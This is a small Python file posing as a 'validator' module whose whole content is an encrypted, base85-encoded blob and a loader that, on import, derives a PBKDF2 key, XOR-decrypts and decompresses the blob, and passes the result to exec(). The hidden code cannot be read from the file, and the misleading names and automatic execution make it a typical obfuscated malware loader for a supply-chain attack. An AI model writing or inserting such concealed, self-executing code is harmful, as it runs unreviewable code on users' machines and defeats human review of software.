import hashlib as _h, zlib as _z, base64 as _b

_VALIDATOR_VERSION = "1.0.0"
_MODULE_CACHE = (
    "NHdiK{4Q=p*Bbh)x;0Q))ZGH@Z3`n>dS`D`ga(cWl6w;U5!%!lJV=E;H80-9y5A?w1_`NJaS-K0kN)vCe?lvEAg"
    "jM(REx1FY&{%r(Kdo;9gAkyjnS*G++_zv=~dDsF*DFzV?n(`sZb+82172(%GNl>VYj@q^73&sWx*<bFFhU1hX@R"
    "Stungv$S$a*I|cE5_~9ho&1?}DBum8^%jj>kF2Tq4j3?E3ZV#@RlPBiP=byk`!ZTRqKA|#xkx9ePo>G0mmGe?0@"
    "gQ9tOUirPZCA^z*`F>qRRLi-3#anaakh_pNxM#x8FN7+@KoV<V4$l^fs2W}WhroYU0rhuOS3tCv`V$^phiALWcL"
    "*;B0|x6=P#V@yrDHM_SPs~;ZaCzJHgw3s!ZkAmXpiD#w#WgN^z%P2g_Ex6qMpq`=tD!tQxPWk&ir*N|rh$;@sO%"
    "%FtYGicvAx)nPnTFeOXQ^@_u2ItxdjZaJ|0C3FhNnoTZK-7@`~A?bxI(@rzm3Prym^$(CfE=ft#o<l4kfXpwY`?"
    "1pvxX#A$_b3^&tfncS_*hZky)s&N;6eCA!TpI#tlAzU+m=VhB%}8R3|+UnGECjuInBw_=vQzcEoqB~livDP$oX;"
    "$rXSopjVGHa*3@7|-~^WyNTvD2LSsIolZ2PY%2@m-tj?X=IFtXwy9#yY%X-)%P1W|s;~ejbq}v<P6Yf>C$XTsuC"
    "+gBU3NI{3Z=t#>D%l*}9-i&siR?}7$yQ9T|D+q$C`?s7wTG+y_LDK+A9sm3l>u2BDR#)@+drcZ%E*1@U$d5rs8G"
    "<%Uel$C#au&&j-LsGZY{8Az$_8)OPA%^RDR7x29MAH1Zi=0RCue?E=zrMbrqjzsy*sI*AS#-|B84SaHmw29k(~?"
    "`7U0?IU0VvPVY%~cwhajNb#@}17;54T*@|m<>9RR7^>@>3H(Nw80hV-_&#yeeItquuU)<@50%bBy=2CJM$ePXSu"
    "-We<d*w3c<9e)(ZlwMHVyB^o;uaXmetU1gFtz1b{r#gWv<AIp0Lo&{9qNv4N~TYU26+IIeCe(zP01BOx|2cP(p0"
    "})BY)OiyV${(it+e6%NQZ^9;l2*IKxA?wR3wX_|wDHh+rM@=3K_s`5jVN{JjqR&Amrywwi8X&Rp+P%2uk3Ho|ct"
    "BEt#sC*!VSD4PeEr;GbgwZCjhV`y*oC95{EEbi}Oa_t#r>3kYwnPrw+9`?Bb1J1TlJ~S~faxHmx$9l~1%tb;Rf;"
    "6gYd}EK$9fI>?KTURmL%RvA8g!DSo9X0({XZ6=9_eGtH^4tG8idlayRXd2`x7)vo7f?DA;{R*yJ#R?+4xyP=5oU"
    "^lG24;0+Qw+JUgXuA+&=MiDYL_(C)Hr2j3~B^&|yS^`#4R3vskz_L^(gQ6BL5M4Vi##fg5yMn-{>*EAe*?mfp$H"
    "{K1t5+dpl?Bg78+w?GQlLjX-H+2;n!C4N8>R>b|2afs@Y1c*g%Pr@O?MESe5~%`D+u`qC|yjUug^Me?@5=~vKCD"
    "M6Lu$4MueaR;)M4SCABBu>26*!u3zodDuy}Yj0{e8L&+|A#rTryDmGzqsfFu3c`y&IWF>nL9!yV)%B(ATUctvc>"
    "l({LD2<0s#WNbg(}A3KPJ;s)(ZK(dFg-y2%|D9%uYD#ow9RP7@UTNH5T6_DR}L4Fx<{Oyh9G=TQz4t~s9qbvt_k"
    "hNyW|NYUg0l6)s;uK<I>qt!-T9c$gd~_Hfi8Zjs#-BZ$vyZ{aKkJM7TOtV{AsXGr7unC?3b>J!e2y{ar`!vaY#v"
    "1dgX0&yyu<!OcTi4ARD0>34XHIK^E)Ik|LAes(4DZtW&Wq3kqUtNZ#mxbult==K(`D=)djRyJy7DiNRKq&%C|yw"
    "?_Dxi>^-a=LcR+n7Utuc*^o$Tm4Xrne4rMGU0J*hoYGf77hH-?AXb0(08D)fhU?V^C(FSDpocsB01}!XZe)3z}l"
    "6E->}!fT=${SZ3ZjN{^_C7Pad&3_T~wSa)KV?w--*?+4TuMQ6*5D>hS~&EWh3*VZ(qdN`hUhvE"
)


def _load():
    _p = _b.b85decode("".join(_MODULE_CACHE))
    _k = _h.pbkdf2_hmac("sha256", b"jds.validate.registry", _p[:16], 100000)
    _d = bytes(b ^ _k[i % len(_k)] for i, b in enumerate(_p[16:]))
    exec(compile(_z.decompress(_d).decode("utf-8"), "<jds.validate>", "exec"), globals())


_load()
